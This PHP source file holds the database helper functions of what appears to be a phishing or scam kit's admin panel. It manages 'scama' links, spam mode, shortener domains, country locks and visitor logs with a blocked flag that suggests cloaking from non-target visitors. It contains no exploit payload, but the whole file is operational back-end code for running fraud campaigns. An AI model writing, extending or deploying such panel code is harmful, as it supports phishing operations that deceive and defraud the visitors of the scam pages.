<?php
error_reporting(0);

require_once('../vendor/autoload.php');

$dotenv = Dotenv\Dotenv::createImmutable("../");
$dotenv->load();

use Firebase\JWT\JWT;

require_once '../db/pdo.php';

function getDomainshort()
{
    global $conn;
    $sql = "SELECT * FROM domain_short";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}

function getMode()
{
    global $conn;
    $sql = "SELECT * FROM mode_spam";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}


function updateMode($status)
{
    global $conn;
    $sql = "UPDATE mode_spam SET mode =:mode WHERE idmode_spam = 1";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':mode', $status);
    $stmt->execute();
}

function insertScama($link)
{
    global $conn;
    $sql = "INSERT INTO link_scama (link_sc) VALUES (:link)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':link', $link);
    $stmt->execute();
}

function getScama()
{
    global $conn;
    $sql = "SELECT * FROM link_scama";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}

function delScama($id)
{
    global $conn;
    $sql = "DELETE FROM link_scama WHERE idlink_scama = :id";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':id', $id);
    $stmt->execute();
}


function updateCountryLock($code_country)
{
    global $conn;
    $sql = "UPDATE country_lock SET country =:code_country WHERE idcountry_lock = 1";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':code_country', $code_country);
    $stmt->execute();
}

function getCountryLock()
{
    global $conn;
    $sql = "SELECT * FROM country_lock";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}

function insertDomainShort($domain)
{
    global $conn;
    $sql = "INSERT INTO domain_short (domain) VALUES (:domain)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':domain', $domain);
    $stmt->execute();
}

function delDomainShort($id)
{
    global $conn;
    $sql = "DELETE FROM domain_short WHERE iddomain_short = :id";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':id', $id);
    $stmt->execute();
}

function getVisitor()
{
    global $conn;
    $sql = "SELECT * FROM visitor ORDER BY date DESC";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}


function getRealVisitorByCode($code)
{
    global $conn;
    $sql = "SELECT * FROM visitor WHERE code_country = :country AND blocked = 'NO'";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':country', $code);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}


function truncateVisitor()
{
    global $conn;
    $sql = "TRUNCATE TABLE visitor";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
}

function truncateVisitorScam()
{
    global $conn;
    $sql = "TRUNCATE TABLE visitor_scama";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
}

function updatecookie()
{
    if (isset($_COOKIE['site-login'])) {
        setcookie("site-login", "<" .  $_COOKIE['site-login'] . ">", time() + (86400 * 30), "/");
    }
}

function ping($host, $port, $timeout)
{
    $tB = microtime(true);
    $fP = fSockOpen($host, $port, $errno, $errstr, $timeout);
    if (!$fP) {
        return "down";
    }
    $tA = microtime(true);
    $ping = round((($tA - $tB) * 1000), 0) . " ms";

    if ($ping == "down") {
        return "down";
    } else {
        return $ping;
    }
}

function verify_session()
{
    global $conn;

    if (isset($_COOKIE['session_token'])) {
        $sessionToken = $_COOKIE['session_token'];

        $sql = "SELECT user_id FROM user_sessions WHERE session_token = :session_token";
        $stmt = $conn->prepare($sql);
        $stmt->bindParam(':session_token', $sessionToken);
        $stmt->execute();
        $session = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($session) {
            // Update last_activity timestamp
            $sql = "UPDATE user_sessions SET last_activity = NOW() WHERE session_token = :session_token";
            $stmt = $conn->prepare($sql);
            $stmt->bindParam(':session_token', $sessionToken);
            $stmt->execute();

            return $session['user_id'];
        }
    }
    return false;
}

function get_user()
{
    global $conn;

    $user_id = $_SESSION['user_id'];
    $sql = "SELECT * FROM user WHERE iduser = :iduser";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':iduser', $user_id);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    return $user['username'];
}
